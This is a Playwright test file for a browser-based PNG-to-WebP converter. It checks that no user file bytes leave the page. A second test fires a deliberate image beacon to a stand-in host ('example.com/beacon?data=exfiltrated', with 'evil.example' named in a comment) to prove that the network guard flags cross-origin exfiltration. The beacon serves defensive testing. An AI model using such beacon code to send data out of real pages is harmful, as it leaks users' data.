import { expect, test } from "@playwright/test";
import { watchForSuspiciousRequests } from "./network-guard";

test("converts a PNG to WebP entirely in the browser with zero bytes uploaded", async ({
	page,
	baseURL,
}) => {
	// Resolved from config, before any navigation happens, so requests made
	// during the very first load are judged against the right origin instead
	// of an empty string.
	const appOrigin = baseURL ? new URL(baseURL).origin : "";
	const suspicious = watchForSuspiciousRequests(page, () => appOrigin);

	await page.goto("/image/png-to-webp");

	await expect(
		page.getByRole("heading", { name: "Convert PNG to WebP" }),
	).toBeVisible();
	// Fidelity is shown as a scored ring (FidelityScore), not a text badge —
	// its accessible name still states the guarantee in words.
	await expect(page.getByRole("img", { name: /LOSSLESS/ })).toBeVisible();

	await page.setInputFiles("input[type=file]", "e2e/fixtures/diagram.png");
	await page.getByRole("button", { name: "CONVERT" }).click();

	await expect(page.getByTestId("result")).toBeVisible({ timeout: 60_000 });

	expect(suspicious, "no request may carry user file bytes").toEqual([]);
});

test("the network guard actually catches a cross-origin GET beacon", async ({
	page,
	baseURL,
}) => {
	// This is the guard's own guard: a detector that has never been shown to
	// fire on real exfiltration traffic is not evidence of anything. This
	// test injects a deliberate cross-origin GET — the same shape as an
	// `<img src="https://evil.example/…">` beacon — and asserts it is
	// flagged, so a regression that quietly re-exempts GET traffic (as the
	// bug this file was written to fix once did) fails loudly here instead
	// of passing silently above.
	const appOrigin = baseURL ? new URL(baseURL).origin : "";
	const suspicious = watchForSuspiciousRequests(page, () => appOrigin);

	await page.goto("/image/png-to-webp");

	const beaconUrl = "https://example.com/beacon?data=exfiltrated";
	// Abort the request at the network layer rather than letting it actually
	// reach example.com: this keeps the test deterministic and independent
	// of outbound network access in CI. Playwright's "request" event — which
	// is what the guard listens on — fires regardless of whether a route
	// handler later aborts the request.
	await page.route(beaconUrl, (route) => route.abort());

	const [beaconRequest] = await Promise.all([
		page.waitForRequest(beaconUrl),
		page.evaluate((url) => {
			new Image().src = url;
		}, beaconUrl),
	]);
	expect(beaconRequest.url()).toBe(beaconUrl);

	expect(
		suspicious.some((entry) => entry.includes(beaconUrl)),
		"a cross-origin GET beacon must be flagged as suspicious",
	).toBe(true);
});
